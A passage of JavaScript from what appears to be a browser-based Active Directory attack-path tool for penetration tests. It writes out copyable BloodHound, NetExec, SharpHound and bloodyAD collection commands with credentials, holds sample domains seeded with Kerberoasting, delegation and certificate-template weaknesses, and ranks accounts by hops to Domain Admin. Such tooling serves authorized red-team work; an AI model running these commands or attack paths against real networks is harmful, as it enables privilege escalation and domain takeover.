    var nxcAuth = ctx.nt ? ('-H ' + ctx.nt) : ("-p '" + String(pw).replace(/'/g, "'\\''") + "'");

    var cmds = [
      {
        label: '1. From Kali (bloodhound-python - collects JSONs + ZIP directly over LDAP/SMB)',
        cmd: "bloodhound-python -d '" + dom + "' -u '" + user + "' " + authFlag + ' -ns ' + dc + ' -c All --zip'
      },
      {
        label: '2. From Kali (NetExec built-in BloodHound collector)',
        cmd: 'nxc ldap ' + dc + " -d '" + dom + "' -u '" + user + "' " + nxcAuth + ' --bloodhound -c All --dns-server ' + dc
      },
      {
        label: '3. From a Windows foothold (SharpHound.exe)',
        cmd: '.\\SharpHound.exe -c All -d ' + dom + ' --zipfilename bh-collection.zip'
      },
      {
        label: '4. Fast ACL fallback without BloodHound (bloodyAD writable object check)',
        cmd: "bloodyAD -d '" + dom + "' --host " + dc + " -u '" + user + "' " + (ctx.nt ? ("-p ':" + ctx.nt + "'") : ("-p '" + String(pw).replace(/'/g, "'\\''") + "'")) + ' get writable --detail'
      }
    ];

    var rows = cmds.map(function (c) {
      return '<div class="bh-acq-why">' + esc(c.label) + '</div>'
        + '<div class="bh-cmd"><code>' + esc(c.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(c.cmd) + '">Copy</button></div>';
    }).join('');

    return '<details class="bh-detail bh-collect-guide"' + (hasSummary ? '' : ' open') + '>'
      + '<summary>How to Collect BloodHound Data (1-Click Copy Commands)</summary>'
      + '<div class="bh-acq">' + rows + '</div></details>';
  }

  // Three built-in sample AD topologies for learning, testing, and exploring the interactive graph
  function getSamplePreset(presetId) {
    var DOM1 = 'S-1-5-21-1111111111-2222222222-3333333333';
    var DOM2 = 'S-1-5-21-4444444444-5555555555-6666666666';
    if (presetId === 'forest') {
      return {
        owned: ['SVC_DEPLOY@CORP.LOCAL'],
        data: {
          domains: [
            {
              ObjectIdentifier: DOM1,
              Properties: { name: 'CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
              Trusts: [{ TargetDomainName: 'DEV.CORP.LOCAL', TargetDomainSid: DOM2, TrustDirection: 'Bidirectional', TrustType: 'ParentChild', IsTransitive: true, SidFilteringEnabled: false }],
              Aces: [{ PrincipalSID: DOM1 + '-2102', PrincipalType: 'Group', RightName: 'WriteDacl', IsInherited: false }]
            },
            {
              ObjectIdentifier: DOM2,
              Properties: { name: 'DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', highvalue: true },
              Trusts: [{ TargetDomainName: 'CORP.LOCAL', TargetDomainSid: DOM1, TrustDirection: 'Bidirectional', TrustType: 'ParentChild', IsTransitive: true, SidFilteringEnabled: false }],
              Aces: []
            }
          ],
          ous: [
            {
              ObjectIdentifier: 'OU-SERVERS-01',
              Properties: { name: 'SERVERS_OU@CORP.LOCAL', domain: 'CORP.LOCAL' },
              Links: [{ GUID: 'GPO-SERVERS-01', IsEnforced: false }],
              ChildObjects: [{ ObjectIdentifier: DOM1 + '-1109', ObjectType: 'User' }]
            }
          ],
          gpos: [
            {
              ObjectIdentifier: 'GPO-SERVERS-01',
              Properties: { name: 'SERVER_POLICY_GPO@CORP.LOCAL', domain: 'CORP.LOCAL' },
              Aces: [{ PrincipalSID: DOM1 + '-1101', PrincipalType: 'User', RightName: 'GenericWrite', IsInherited: false }]
            }
          ],
          users: [
            { ObjectIdentifier: DOM1 + '-500', Properties: { name: 'ADMIN@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, highvalue: true } },
            { ObjectIdentifier: DOM2 + '-500', Properties: { name: 'ADMIN@DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', enabled: true, highvalue: true }, HasSIDHistory: [{ ObjectIdentifier: DOM1 + '-519' }] },
            { ObjectIdentifier: DOM1 + '-1101', Properties: { name: 'SVC_DEPLOY@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true } },
            { ObjectIdentifier: DOM1 + '-1109', Properties: { name: 'BACKUP_ADM@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true }, Aces: [] },
            { ObjectIdentifier: DOM2 + '-1201', Properties: { name: 'DEV_LEAD@DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', enabled: true, hasspn: true } }
          ],
          groups: [
            {
              ObjectIdentifier: DOM1 + '-512',
              Properties: { name: 'DOMAIN ADMINS@CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
              Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }, { ObjectIdentifier: DOM1 + '-1109', ObjectType: 'User' }]
            },
            {
              ObjectIdentifier: DOM1 + '-519',
              Properties: { name: 'ENTERPRISE ADMINS@CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
              Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }]
            },
            {
              ObjectIdentifier: DOM2 + '-512',
              Properties: { name: 'DOMAIN ADMINS@DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', highvalue: true },
              Members: [{ ObjectIdentifier: DOM2 + '-500', ObjectType: 'User' }, { ObjectIdentifier: DOM2 + '-1201', ObjectType: 'User' }]
            },
            {
              ObjectIdentifier: DOM1 + '-2102',
              Properties: { name: 'EXCHANGE WINDOWS PERMISSIONS@CORP.LOCAL', domain: 'CORP.LOCAL' },
              Members: [{ ObjectIdentifier: DOM2 + '-1201', ObjectType: 'User' }]
            }
          ],
          computers: [
            { ObjectIdentifier: DOM1 + '-1001', Properties: { name: 'DC01.CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true } },
            { ObjectIdentifier: DOM2 + '-1001', Properties: { name: 'DEV-DC01.DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', enabled: true } }
          ]
        }
      };
    }
    if (presetId === 'delegation') {
      return {
        owned: ['WEB_SVC@LAB.LOCAL'],
        data: {
          domains: [
            { ObjectIdentifier: DOM1, Properties: { name: 'LAB.LOCAL', domain: 'LAB.LOCAL', highvalue: true }, Aces: [] }
          ],
          users: [
            { ObjectIdentifier: DOM1 + '-500', Properties: { name: 'ADMINISTRATOR@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, highvalue: true } },
            { ObjectIdentifier: DOM1 + '-1101', Properties: { name: 'WEB_SVC@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true }, Aces: [] },
            {
              ObjectIdentifier: DOM1 + '-1102',
              Properties: { name: 'GMSA_APP$@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, gmsa: true },
              Aces: [{ PrincipalSID: DOM1 + '-1101', PrincipalType: 'User', RightName: 'ReadGMSAPassword', IsInherited: false }]
            },
            {
              ObjectIdentifier: DOM1 + '-1103',
              Properties: { name: 'SQL_PROXY@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, allowedtodelegate: ['cifs/DC01.LAB.LOCAL'] },
              Aces: [{ PrincipalSID: DOM1 + '-1102', PrincipalType: 'User', RightName: 'ForceChangePassword', IsInherited: false }]
            },
            { ObjectIdentifier: DOM1 + '-1104', Properties: { name: 'DA_OPER@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true } }
          ],
          groups: [
            {
              ObjectIdentifier: DOM1 + '-512',
              Properties: { name: 'DOMAIN ADMINS@LAB.LOCAL', domain: 'LAB.LOCAL', highvalue: true },
              Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }, { ObjectIdentifier: DOM1 + '-1104', ObjectType: 'User' }]
            }
          ],
          computers: [
            {
              ObjectIdentifier: DOM1 + '-1001',
              Properties: { name: 'DC01.LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, unconstraineddelegation: true },
              Sessions: { Collected: true, Results: [{ UserSID: DOM1 + '-500', ComputerSID: DOM1 + '-1001' }] }
            },
            {
              ObjectIdentifier: DOM1 + '-1002',
              Properties: { name: 'WS01.LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, haslaps: true },
              LocalAdmins: { Collected: true, Results: [{ ObjectIdentifier: DOM1 + '-1102', ObjectType: 'User' }] },
              AllowedToAct: { Collected: true, Results: [{ ObjectIdentifier: DOM1 + '-1101', ObjectType: 'User' }] },
              Sessions: { Collected: true, Results: [{ UserSID: DOM1 + '-1104', ComputerSID: DOM1 + '-1002' }] }
            }
          ]
        }
      };
    }
    // Default 'single': Single-Domain ACL, Kerberoast, AS-REP & AD CS
    return {
      owned: ['SVC_ALFRESCO@CORP.LOCAL'],
      data: {
        domains: [
          {
            ObjectIdentifier: DOM1,
            Properties: { name: 'CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
            Aces: [
              { PrincipalSID: DOM1 + '-2102', PrincipalType: 'Group', RightName: 'WriteDacl', IsInherited: false }
            ]
          }
        ],
        users: [
          { ObjectIdentifier: DOM1 + '-500', Properties: { name: 'ADMINISTRATOR@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, highvalue: true } },
          { ObjectIdentifier: DOM1 + '-1101', Properties: { name: 'SVC_ALFRESCO@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, dontreqpreauth: true } },
          { ObjectIdentifier: DOM1 + '-1102', Properties: { name: 'SQLSVC@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, hasspn: true } },
          { ObjectIdentifier: DOM1 + '-1103', Properties: { name: 'HELPDESK@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, passwordnotreqd: true } }
        ],
        groups: [
          {
            ObjectIdentifier: DOM1 + '-512',
            Properties: { name: 'DOMAIN ADMINS@CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
            Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }]
          },
          {
            ObjectIdentifier: DOM1 + '-2101',
            Properties: { name: 'ACCOUNT OPERATORS@CORP.LOCAL', domain: 'CORP.LOCAL' },
            Members: [{ ObjectIdentifier: DOM1 + '-1101', ObjectType: 'User' }]
          },
          {
            ObjectIdentifier: DOM1 + '-2102',
            Properties: { name: 'EXCHANGE WINDOWS PERMISSIONS@CORP.LOCAL', domain: 'CORP.LOCAL' },
            Members: [],
            Aces: [
              { PrincipalSID: DOM1 + '-2101', PrincipalType: 'Group', RightName: 'GenericAll', IsInherited: false },
              { PrincipalSID: DOM1 + '-1102', PrincipalType: 'User', RightName: 'AddSelf', IsInherited: false }
            ]
          }
        ],
        computers: [
          {
            ObjectIdentifier: DOM1 + '-1001',
            Properties: { name: 'DC01.CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, unconstraineddelegation: true },
            LocalAdmins: { Collected: true, Results: [{ ObjectIdentifier: DOM1 + '-513', ObjectType: 'Group' }] }
          }
        ],
        certtemplates: [
          {
            ObjectIdentifier: 'CERT-ESC1-01',
            Properties: { name: 'CorpUserESC1', enabled: true, enrolleesuppliessubject: true, authenticationenabled: true }
          }
        ]
      }
    };
  }

  function loadSamplePreset(presetId) {
    var preset = getSamplePreset(presetId);
    var summary = OBOL.bloodhound.ingestObjects(preset.data);
    summary.ownedExtra = preset.owned.slice();
    var owned = ownedFromEngagement().concat(preset.owned);
    var paths = OBOL.bloodhound.ownedPaths(summary, owned);
    var facts = OBOL.bloodhound.toFacts(summary, paths, 'domain:' + (summary.domain || 'domain'));
    OBOL.store.update(function (eng) {
      eng.bloodhound = summary;
      if (Array.isArray(eng.facts)) {
        eng.facts = eng.facts.filter(function (f) { return !f || !/^bloodhound/i.test(String(f.source || '')); });
      }
    }, 'bloodhound-preset');
    OBOL.store.addFacts(facts, 'bloodhound-preset');
    if (OBOL.app && OBOL.app.renderSidebar) OBOL.app.renderSidebar();
    if (U && U.toast) U.toast('Loaded sample AD topology: ' + (summary.domains && summary.domains.length > 1 ? summary.domains.join(' + ') : summary.domain));
    OBOL.router.render();
  }

  function samplePresetsHtml(hasSummary) {
    return '<div class="bh-presets">'
      + '<span class="bh-leg-title">Explore Sample AD Topologies:</span> '
      + '<button type="button" class="btn-ghost" data-bh-preset="single">1. Single-Domain ACL &amp; Roasting</button> '
      + '<button type="button" class="btn-ghost" data-bh-preset="forest">2. Multi-Domain Forest, Trusts &amp; GPO</button> '
      + '<button type="button" class="btn-ghost" data-bh-preset="delegation">3. Delegation, RBCD, gMSA &amp; Sessions</button>'
      + (hasSummary ? ' <button type="button" class="btn-ghost" id="bh-clear">Clear Collection</button>' : '')
      + '</div>';
  }

  function render() {
    var eng = OBOL.store.active();
    var engId = (eng && eng.id) || null;
    if (engId !== _lastEngId) {
      _lastEngId = engId;
      _whatIf = {};
      _inspecting = null;
    }
    var summary = eng && eng.bloodhound;
    var html = '<section class="domain-route">'
      + '<h1 class="route-h1">Domain (BloodHound)</h1>'
      + '<p class="route-sub">Upload a SharpHound <code>.zip</code> (or BloodHound-CE <code>.json</code> files). Everything is parsed and analysed in your browser, nothing is uploaded anywhere.</p>'
      + liveAdFactsHtml()
      + '<div class="bh-drop" id="bh-drop" tabindex="0" role="button">Drop a SharpHound .zip here, or click to choose files'
      + '<input type="file" id="bh-file" accept=".zip,.json" multiple hidden></div>'
      + samplePresetsHtml(!!summary)
      + collectionGuideHtml(!!summary)
      + '<div id="bh-status" class="route-sub"></div>';

    if (summary) {
      var realOwned = ownedFromEngagement();
      var owned = effectiveOwned();
      var ownedUpper = {}; owned.forEach(function (o) { ownedUpper[shortName(o).toUpperCase()] = 1; ownedUpper[String(o).toUpperCase()] = 1; });
      var realUpper = {}; realOwned.forEach(function (o) { realUpper[shortName(o).toUpperCase()] = 1; realUpper[String(o).toUpperCase()] = 1; });
      var whatIfN = whatIfList().length;
      var view = OBOL.bloodhound.domainView(summary, owned, cmdCtx(owned, true));

      var plist = OBOL.bloodhound.principalList(summary, { types: ['users', 'groups', 'computers'] });
      var opts = '<option value="">Select an account to inspect...</option>' + plist.map(function (p) {
        var up = p.short.toUpperCase();
        var fullUp = String(p.name || '').toUpperCase();
        var mk = (realUpper[fullUp] || realUpper[up]) ? ' (owned)' : ((_whatIf[fullUp] || _whatIf[up]) ? ' (what-if)' : '');
        var hop = (p.hops != null)
          ? (p.hops === 0 ? ' \u00b7 Domain Admin goal' : (' \u00b7 ' + p.hops + ' hop' + (p.hops === 1 ? '' : 's') + ' to DA'))
          : ' \u00b7 no path to DA';
        return '<option value="' + U.attr(p.name) + '">' + esc(p.short) + mk + ' \u00b7 ' + esc(p.type) + hop + '</option>';
      }).join('');

      var uCount = typeof summary.users === 'number' ? summary.users : (summary.users ? summary.users.length : 0);
      var cCount = typeof summary.computers === 'number' ? summary.computers : (summary.computers || []).length;
      var domDisplay = (summary.domains && summary.domains.length > 1)
        ? (summary.domains.join(' + ') + ' (' + summary.domains.length + ' domains)')
        : (summary.domain || 'domain');
      html += '<div class="bh-summary-head"><h2 class="coach-sec-h">' + esc(domDisplay)
        + ': ' + uCount + ' users, ' + cCount + ' computers'
        + (realOwned.length ? ('<span class="bh-owned-count">' + realOwned.length + ' owned</span>') : '')
        + (whatIfN ? ('<span class="bh-owned-count whatif">' + whatIfN + ' what-if</span>') : '') + '</h2>'
        + '<div class="bh-head-controls"><label class="bh-inspect-lbl">Inspect <select id="bh-inspect" class="bh-select">' + opts + '</select></label>'
        + '<button id="bh-report" class="btn-primary">Open Report</button></div></div>'
        + '<div id="bh-inspect-slot" class="bh-inspect-slot"></div>';

      if (whatIfN) {
        var wiAll = whatIfList();
        var deadWi = wiAll.filter(function (w) {
          var wp = OBOL.bloodhound.ownedPaths(summary, [w]);
          return !(wp && wp.paths && wp.paths.length);
        }).map(shortName);
        var deadWiNote = deadWi.length
          ? (' <span class="bh-whatif-dead">(Note: <b>' + esc(deadWi.join(', ')) + '</b> ' + (deadWi.length === 1 ? 'has' : 'have') + ' 0 outbound paths to Domain Admin in this collection - shown on the left of the graph as a dead-end node.)</span>')
          : '';
        html += '<div class="bh-whatif-banner"><span class="bh-whatif-k">What-If: showing the picture as if you also owned '
          + wiAll.map(function (w) { return '<b>' + esc(shortName(w)) + '</b>'; }).join(', ') + '.' + deadWiNote + '</span>'
          + '<button id="bh-whatif-commit" class="btn-ghost">Commit To Engagement</button>'
          + '<button id="bh-whatif-clear" class="btn-ghost">Clear What-If</button></div>';
      }

      html += diffHtml(summary.diff);

      var q = coachQueued();
      if (q.top) {
        var fast = (summary.diff && summary.diff.route) ? true : false;
        html += '<a class="bh-bridge' + (fast ? ' fast' : '') + '" href="#/path">'
          + '<span class="bh-bridge-k">' + (fast ? 'A faster route to Domain Admin opened. ' : '') + 'OBOL turned this graph into your next moves.</span> '
          + '<span class="bh-bridge-top">Next up: ' + esc(q.top.title) + '</span>'
          + '<span class="bh-bridge-go">Open Cockpit \u2192</span></a>';
      }

      html += '<div id="bh-route-slot">' + routeStepsHtml(view, owned, summary, cmdCtx(owned, true)) + '</div>';

      html += '<h2 class="coach-sec-h">Attack-path graph</h2>'
        + '<div id="bh-graph" class="bh-graph-host">'
        + (owned.length ? '' : '<div class="coach-empty">Own an account (a credential, or tick "I Own This" on an inspected account) to derive and graph owned->Domain-Admin paths.</div>')
        + '</div>';

      html += huntHtml(summary, owned, cmdCtx(owned, true));

      var near = (OBOL.bloodhound.nearestToGoal(summary) || []).filter(function (r) { return /user|group|computer/.test(r.type); });
      if (near.length) {
        function browHtml(r) {
          var isOwn = ownedUpper[String(r.name).toUpperCase()] || ownedUpper[shortName(r.name).toUpperCase()];
          var disp = (summary.domains && summary.domains.length > 1) ? r.name : shortName(r.name);
          return '<button class="bh-brow' + (isOwn ? ' owned' : '') + '" data-explore="' + U.attr(r.name) + '"><span class="bh-bhops">' + r.hops + ' hop' + (r.hops === 1 ? '' : 's') + '</span>'
            + '<span class="bh-btype">' + esc(r.type) + '</span><span class="bh-bname">' + esc(disp) + (isOwn ? ' <span class="bh-tag own">owned</span>' : '') + '</span></button>';
        }
        html += '<h2 class="coach-sec-h">Closest To Domain Admin</h2>'
          + '<p class="route-sub">Fewest hops to Domain Admin, who to go after next. Click a row to inspect that account\'s paths and what it controls.</p>'
          + '<div class="bh-board">' + near.slice(0, 12).map(browHtml).join('') + '</div>';
        if (near.length > 12) {
          html += '<div class="bh-board bh-more" hidden>' + near.slice(12).map(browHtml).join('') + '</div>'
            + '<button class="bh-more-btn" type="button">+ ' + (near.length - 12) + ' more account' + (near.length - 12 === 1 ? '' : 's') + '</button>';
        }
      }

      function cardHtml(s) {
        var items = s.items || s.principals || [];
        var n = items.length || s.count || 0;
        var cls = /admin|dcsync|unconstrained|constrained|rbcd|gpo|sid history|domain admin|enterprise/i.test(s.title)
          ? 'crit'
          : (/kerberoast|as-?rep|roast|trust|gmsa|laps/i.test(s.title) ? 'warn' : '');
        var free = /as-?rep|password not required/i.test(s.title);
        var cmds = (s.commands || []).slice(0, 3).map(function (c) {
          var line = typeof c === 'string' ? c : (c.run || c.cmd || c.command || '');
          return line ? '<div class="bh-cmd"><code>' + esc(line) + '</code><button class="btn-copy" data-copy="' + U.attr(line) + '">Copy</button></div>' : '';
        }).join('');
        var detail = items.length
          ? '<details class="bh-detail"><summary>' + items.length + ' ' + (items.length === 1 ? 'match' : 'matches') + '</summary>'
            + '<ul class="bh-princ">' + items.map(function (p) {
                var exploreTarget = String(p).split(' -> ')[0].split(' \u2192 ')[0].split(' -[')[0].split(' @ ')[0].trim();
                var owns = ownedUpper[exploreTarget.toUpperCase()] || ownedUpper[shortName(exploreTarget).toUpperCase()];
                return '<li><button class="bh-princ-x" data-explore="' + U.attr(exploreTarget) + '">' + esc(p) + '</button>'
                  + (owns ? ' <span class="bh-tag own">owned</span>' : '') + '</li>';
              }).join('') + '</ul></details>'
          : '';
        return '<div class="bh-card"><h3>' + esc(s.title) + (free ? ' <span class="bh-tag free">costs nothing</span>' : '') + '</h3>'
          + '<div class="bh-count ' + cls + '">' + n + '</div>'
          + (s.hint ? '<div class="bh-hint">' + esc(s.hint) + '</div>' : '')
          + (s.cash ? '<div class="bh-cash">' + esc(s.cash) + '</div>' : '')
          + detail + (cmds ? '<div class="bh-cmds">' + cmds + '</div>' : '') + '</div>';
      }
      var secs = view.sections || [];
      var matched = secs.filter(function (s) { return (s.items || s.principals || []).length || s.count; });
      var empty = secs.filter(function (s) { return !((s.items || s.principals || []).length || s.count); });
      html += '<h2 class="coach-sec-h">High-Value Queries</h2><div class="bh-census">' + matched.map(cardHtml).join('') + '</div>';
      if (empty.length) {
        html += '<details class="bh-empties"><summary>Show ' + empty.length + ' queries with no matches</summary>'
          + '<div class="bh-census">' + empty.map(cardHtml).join('') + '</div></details>';
      }
      html += '<div id="bh-report-slot"></div>';
    }
    html += '</section>';
    return html;
  }

  function readFile(file) {
    return new Promise(function (resolve) {
      var r = new FileReader();
      var isZip = /\.zip$/i.test(file.name);
      r.onload = function () { resolve({ name: file.name, arrayBuffer: isZip ? r.result : undefined, text: isZip ? undefined : r.result }); };
      r.onerror = function () { resolve(null); };
      if (isZip) r.readAsArrayBuffer(file); else r.readAsText(file);
    });
  }

  async function ingest(fileList) {
    var status = document.getElementById('bh-status');
    if (status) status.textContent = 'Parsing ' + fileList.length + ' file(s) in your browser...';
    var files = (await Promise.all(Array.prototype.map.call(fileList, readFile))).filter(Boolean);
    try {
      var prevSummary = (OBOL.store.active() || {}).bloodhound;
      var prevFp = (prevSummary && prevSummary._graph) ? OBOL.bloodhound.graphFingerprint(prevSummary) : null;
      var summary = await OBOL.bloodhound.parse(files);
      summary.diff = prevFp ? OBOL.bloodhound.diffCollections(prevFp, OBOL.bloodhound.graphFingerprint(summary)) : null;
      summary.ownedExtra = (prevSummary && prevSummary.ownedExtra) || [];
      var owned = ownedFromEngagement();
      var paths = OBOL.bloodhound.ownedPaths(summary, owned);
      if (summary.diff && owned.length) {
        var nowLen = (paths.paths && paths.paths[0]) ? paths.paths[0].length : 0;
        var prevLen = (prevSummary && prevSummary._graph)
          ? (function () { var pp = OBOL.bloodhound.ownedPaths(prevSummary, owned); return (pp.paths && pp.paths[0]) ? pp.paths[0].length : 0; })() : 0;
        if (nowLen && (!prevLen || nowLen < prevLen)) summary.diff.route = { now: nowLen, prev: prevLen || null };
      }
      var facts = OBOL.bloodhound.toFacts(summary, paths, 'domain:' + (summary.domain || 'domain'));
      OBOL.store.update(function (eng) {
        eng.bloodhound = summary;
        if (Array.isArray(eng.facts)) {
          eng.facts = eng.facts.filter(function (f) { return !f || !/^bloodhound/i.test(String(f.source || '')); });
        }
      }, 'bloodhound');
      OBOL.store.addFacts(facts, 'bloodhound');
      OBOL.app.renderSidebar();
      var changeNote = (summary.diff && summary.diff.changed) ? ', changes since last collection' : '';
      U.toast('Ingested ' + (summary.domain || 'domain') + ': ' + facts.length + ' facts' + changeNote);
      OBOL.router.render();
    } catch (e) {
      if (status) status.textContent = 'Parse failed: ' + (e && e.message);
      U.toast('BloodHound parse failed', 'err');
    }
  }

  function mounted(ctx) {
    var mount = (ctx && ctx.mount) || document;
    var drop = document.getElementById('bh-drop');
    var input = document.getElementById('bh-file');
    if (drop && input) {
      drop.addEventListener('click', function () { input.click(); });
      drop.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); input.click(); } });
      input.addEventListener('change', function () { if (input.files.length) ingest(input.files); });
      ['dragover', 'dragenter'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.add('drag'); }); });
      ['dragleave', 'drop'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.remove('drag'); }); });
      drop.addEventListener('drop', function (e) { if (e.dataTransfer && e.dataTransfer.files.length) ingest(e.dataTransfer.files); });
    }

    function renderGraph() {
      var eng0 = OBOL.store.active();
      if (!eng0 || !eng0.bloodhound || !OBOL.bhgraph) return;
      var owned0 = effectiveOwned();
      var graphPrincipals = owned0.slice();
      var inspectedSet = {};
      if (_inspecting) {
        var inspKey = shortName(_inspecting).toUpperCase();
        inspectedSet[inspKey] = 1;
        inspectedSet[String(_inspecting).toUpperCase()] = 1;
        if (!owned0.some(function (o) { return shortName(o).toUpperCase() === inspKey; })) {
          graphPrincipals.push(_inspecting);
        }
      }
      var view0 = OBOL.bloodhound.domainView(eng0.bloodhound, graphPrincipals);
      var host = document.getElementById('bh-graph');
      var g = view0.analysis && view0.analysis.graph;
      if (host && g && g.nodes && g.nodes.length) {
        var ownedSet = {};
        owned0.forEach(function (o) {
          ownedSet[shortName(o).toUpperCase()] = 1;
          ownedSet[String(o).toUpperCase()] = 1;
        });
        var reachedSet = {};
        owned0.forEach(function (o) {
          var c = OBOL.bloodhound.controls(eng0.bloodhound, o) || { controls: [] };
          (c.controls || []).forEach(function (x) {
            reachedSet[shortName(x.name).toUpperCase()] = 1;
            reachedSet[String(x.name).toUpperCase()] = 1;
          });
        });
        OBOL.bhgraph.renderInto(host, g, {
          onNodeClick: function (id) { doInspect(id, true); },
          onPathSelect: function (pi) {
            var rSlot = document.getElementById('bh-route-slot');
            if (rSlot) rSlot.innerHTML = routeStepsHtml(view0, graphPrincipals, eng0.bloodhound, cmdCtx(graphPrincipals, true), pi);
          },
          owned: ownedSet,
          reached: reachedSet,
          inspected: inspectedSet
        });
      }
    }
    renderGraph();

    U.on(mount, 'click', '.btn-copy', function (e, b) {
      var v = b.getAttribute('data-copy'); if (v) U.copy(v).then(function (ok) { U.toast(ok ? 'Copied' : 'Copy failed', ok ? '' : 'err'); });
    });

    U.on(mount, 'click', '[data-bh-preset]', function (e, b) {
      e.preventDefault();
      var pid = b.getAttribute('data-bh-preset');
      if (pid) loadSamplePreset(pid);
    });

    var clearBtn = document.getElementById('bh-clear');
    if (clearBtn) clearBtn.addEventListener('click', function () {
      _whatIf = {};
      _inspecting = null;
      OBOL.store.update(function (eng) {
        delete eng.bloodhound;
        if (Array.isArray(eng.facts)) {
          eng.facts = eng.facts.filter(function (f) { return !f || !/^bloodhound/i.test(String(f.source || '')); });
        }
      }, 'bloodhound-clear');
      U.toast('Cleared BloodHound collection');
      OBOL.router.render();
    });

    function doInspect(principal, skipGraphRender) {
      var eng = OBOL.store.active(), slot = document.getElementById('bh-inspect-slot');
      if (!eng || !eng.bloodhound || !slot || !principal) return;
      _inspecting = principal;
      var owned = ownedFromEngagement();
      var isOwn = isOwnedPrincipal(principal, owned) || isWhatIf(principal);
      var inspectCtx = isOwn ? cmdCtxFor(principal) : cmdCtx(owned, true);
      slot.innerHTML = inspectHtml(principal, eng.bloodhound, owned, inspectCtx);
      var sel = document.getElementById('bh-inspect');
      if (sel && sel.value !== principal) {
        try {
          sel.value = principal;
          if (sel.value !== principal) {
            var pShort = shortName(principal).toUpperCase();
            for (var oi = 0; oi < sel.options.length; oi++) {
              if (shortName(sel.options[oi].value).toUpperCase() === pShort) { sel.selectedIndex = oi; break; }
            }
          }
        } catch (x) {}
      }
      if (!skipGraphRender) renderGraph();
      try { slot.scrollIntoView({ block: 'nearest' }); } catch (x) {}
    }
    U.on(mount, 'click', '[data-explore]', function (e, t) { e.preventDefault(); doInspect(t.getAttribute('data-explore')); });
    var sel = document.getElementById('bh-inspect');
    if (sel) sel.addEventListener('change', function () {
      var v = sel.value;
      if (!v) { var slot = document.getElementById('bh-inspect-slot'); if (slot) slot.innerHTML = ''; _inspecting = null; renderGraph(); return; }
      doInspect(v);
    });

    U.on(mount, 'change', '.bh-own-check', function (e, c) {
      var who = c.getAttribute('data-own'); if (!who) return;
      var on = c.checked, key = String(who).toUpperCase(), shKey = shortName(who).toUpperCase();
      OBOL.store.update(function (eng) {
        eng.bloodhound = eng.bloodhound || {};
        var set = (eng.bloodhound.ownedExtra || []).filter(function (x) {
          var xUp = String(x).toUpperCase();
          return xUp !== key && shortName(x).toUpperCase() !== shKey;
        });
        if (on) set.push(who);
        eng.bloodhound.ownedExtra = set;
      }, 'bloodhound-owned');
      U.toast(on ? ('Marked ' + shortName(who) + ' as owned') : ('Unmarked ' + shortName(who)));
      OBOL.router.render();
    });

    U.on(mount, 'click', '.bh-more-btn', function (e, b) {
      var more = b.previousElementSibling;
      while (more && !(more.classList && more.classList.contains('bh-more'))) more = more.previousElementSibling;
      if (more) more.hidden = false;
      b.remove();
    });

    U.on(mount, 'click', '[data-whatif-add]', function (e, b) {
      var who = b.getAttribute('data-whatif-add'); if (!who) return;
      _whatIf[String(who).toUpperCase()] = who;
      _whatIf[shortName(who).toUpperCase()] = who;
      U.toast('What-If: added ' + shortName(who));
      OBOL.router.render();
    });
    U.on(mount, 'click', '[data-whatif-remove]', function (e, b) {
      var who = b.getAttribute('data-whatif-remove'); if (!who) return;
      delete _whatIf[String(who).toUpperCase()];
      delete _whatIf[shortName(who).toUpperCase()];
      U.toast('What-If: removed ' + shortName(who));
      OBOL.router.render();
    });
    var wiCommit = document.getElementById('bh-whatif-commit');
    if (wiCommit) wiCommit.addEventListener('click', function () {
      var list = whatIfList();
      OBOL.store.update(function (eng) {
        eng.bloodhound = eng.bloodhound || {};
        var set = eng.bloodhound.ownedExtra || [];
        var have = {}; set.forEach(function (x) { have[shortName(x).toUpperCase()] = 1; });
        list.forEach(function (w) { if (!have[shortName(w).toUpperCase()]) { have[shortName(w).toUpperCase()] = 1; set.push(w); } });
        eng.bloodhound.ownedExtra = set;
      }, 'bloodhound-owned');
      _whatIf = {};
      U.toast('Committed ' + list.length + ' account' + (list.length === 1 ? '' : 's') + ' to the engagement');
      OBOL.router.render();
    });
    var wiClear = document.getElementById('bh-whatif-clear');
    if (wiClear) wiClear.addEventListener('click', function () { _whatIf = {}; U.toast('What-If cleared'); OBOL.router.render(); });

    var rep = document.getElementById('bh-report');
    if (rep) rep.addEventListener('click', function () {
      var eng = OBOL.store.active();
      if (!eng.bloodhound) return;
      var owned = ownedFromEngagement();
      var view = OBOL.bloodhound.domainView(eng.bloodhound, owned, cmdCtx(owned, false));
      var htmlDoc = OBOL.bloodhound.domainReportHtml(eng.bloodhound, view);
      var slot = document.getElementById('bh-report-slot');
